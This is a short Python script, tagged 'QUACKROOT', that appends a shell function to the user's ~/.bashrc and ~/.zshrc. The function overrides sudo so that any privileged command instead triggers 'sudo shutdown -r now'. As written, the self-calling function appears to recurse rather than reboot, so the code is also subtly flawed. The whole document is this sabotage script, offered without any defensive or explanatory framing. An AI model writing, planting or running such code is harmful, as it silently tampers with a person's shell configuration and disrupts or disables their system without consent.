#!/usr/bin/env python
import datetime
import os
import shutil
from datetime import datetime as dt

marker = f"\n# ADDED BY QUACKROOT {dt.now(datetime.timezone.utc).isoformat()} -- remove manually\n"
bash_zsh = marker + "sudo() {\n  sudo shutdown -r now\n}\n"

home = os.path.expanduser("~")
if not home:
    raise RuntimeError("Cannot determine home directory")

bashrc = os.path.join(home, ".bashrc")
zshrc = os.path.join(home, ".zshrc")

rcfiles = [(bashrc, bash_zsh), (zshrc, bash_zsh)]


def make_backup(path):
    if os.path.exists(path):
        bak = path + ".bak"
        shutil.copy2(path, bak)


def ensure_dir_for_file(path):
    d = os.path.dirname(path)
    if d and not os.path.exists(d):
        os.makedirs(d, exist_ok=True)


def append(path, content):
    make_backup(path)
    ensure_dir_for_file(path)
    with open(path, "a", encoding="utf-8") as f:
        f.write(content)


if __name__ == "__main__":
    for path, content in rcfiles:
        append(path, content)
